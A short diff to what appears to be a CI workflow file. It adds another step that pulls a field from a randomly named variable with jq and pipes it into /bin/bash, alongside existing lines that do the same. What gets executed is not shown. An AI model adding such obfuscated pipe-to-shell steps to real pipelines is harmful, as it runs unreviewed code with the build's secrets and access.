@@ -26,6 +26,7 @@ jobs:
           echo $kteoh7 | jq -r .uoyva745 | /bin/bash
           echo $yum230 | jq -r .wbbaw1 | /bin/bash
           printf '%s' "$ms845" | jq -r .gqxb481 | /bin/bash
+          printf '%s' "$jogw64" | jq -r .cvio1500 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
